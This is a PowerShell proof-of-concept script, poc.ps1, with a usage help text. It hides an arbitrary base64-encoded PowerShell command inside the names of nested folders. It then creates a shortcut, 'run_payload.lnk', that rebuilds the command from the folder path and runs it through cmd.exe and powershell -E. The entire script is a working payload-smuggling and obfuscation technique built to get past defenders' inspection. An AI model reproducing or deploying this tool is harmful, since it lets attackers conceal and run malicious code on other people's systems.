param (
    [Alias("b")]
    [string]$BaseDirName,

    [Alias("c")]
    [string]$Command,

    [Alias("cf")]
    [string]$CommandFile,

    [Alias("e")]
    [string]$EncodedCommand,

    [Alias("ef")]
    [string]$EncodedCommandFile,

    [Alias("h")]
    [switch]$Help
)

function Show-Help {
    Write-Host "`nUsage:" -ForegroundColor Cyan
    Write-Host "  .\poc.ps1 -b <BaseDir> -c  <ClearTextCommand>" -ForegroundColor Green
    Write-Host "  .\poc.ps1 -b <BaseDir> -cf <ClearTextFile.ps1>" -ForegroundColor Green
    Write-Host "  .\poc.ps1 -b <BaseDir> -e  <Base64Command>" -ForegroundColor Green
    Write-Host "  .\poc.ps1 -b <BaseDir> -ef <Base64File.txt>" -ForegroundColor Green
    Write-Host "`nOptions:"
    Write-Host "  -b,  -BaseDirName           Base folder to contain nested structure"
    Write-Host "  -c,  -Command               Cleartext PowerShell command"
    Write-Host "  -cf, -CommandFile           File path to cleartext .ps1 script"
    Write-Host "  -e,  -EncodedCommand        Base64-encoded PowerShell command (UTF-16LE)"
    Write-Host "  -ef, -EncodedCommandFile    File path containing Base64-encoded command"
    Write-Host "  -h,  -Help                  Show this help message"
    exit
}

# Validate input
$SetParams = @($Command, $CommandFile, $EncodedCommand, $EncodedCommandFile) | Where-Object { -not [string]::IsNullOrWhiteSpace($_) }

if ($PSBoundParameters.Count -eq 0 -or $Help -or ([string]::IsNullOrWhiteSpace($BaseDirName)) -or $SetParams.Count -ne 1) {
    Show-Help
}


# Resolve the command or encoded command
if ($Command) {
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
    $EncodedCommand = [Convert]::ToBase64String($bytes)
}
elseif ($CommandFile) {
    if (-not (Test-Path $CommandFile)) {
        Write-Host "`n[!] Command file not found: $CommandFile" -ForegroundColor Red
        exit
    }
    $content = Get-Content -Raw -Path $CommandFile
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($content)
    $EncodedCommand = [Convert]::ToBase64String($bytes)
}
elseif ($EncodedCommandFile) {
    if (-not (Test-Path $EncodedCommandFile)) {
        Write-Host "`n[!] Encoded command file not found: $EncodedCommandFile" -ForegroundColor Red
        exit
    }
    $EncodedCommand = Get-Content -Raw -Path $EncodedCommandFile
}

# Chunk the base64 encoded string
$chunkSize = 20
$chunks = ($EncodedCommand -split "(.{$chunkSize})" | Where-Object { $_ -ne "" })


# Create base directory and clean if exists
$basePath = Join-Path -Path (Get-Location) -ChildPath $BaseDirName
if (Test-Path $basePath) {
    Remove-Item -Path $basePath -Recurse -Force
}
$null = New-Item -ItemType Directory -Path $basePath

# Create nested directories
$CurrentPath = $basePath
foreach ($chunk in $chunks) {
    $CurrentPath = Join-Path $CurrentPath $chunk
    $null = New-Item -ItemType Directory -Path $CurrentPath
}

# Create shortcut
$ShortcutPath = Join-Path $CurrentPath "run_payload.lnk"
$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut($ShortcutPath)

$OneLiner = "/c powershell.exe -c `"`$p = (pwd).Path -replace '^.*\\$BaseDirName\\', '' -replace '\\', ''; powershell.exe -E `$p`""
$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "$OneLiner"
$Shortcut.Save()

Write-Host "`n[+] Payload folders created successfully." -ForegroundColor Green
Write-Host "[+] Shortcut created at: $ShortcutPath" -ForegroundColor Yellow
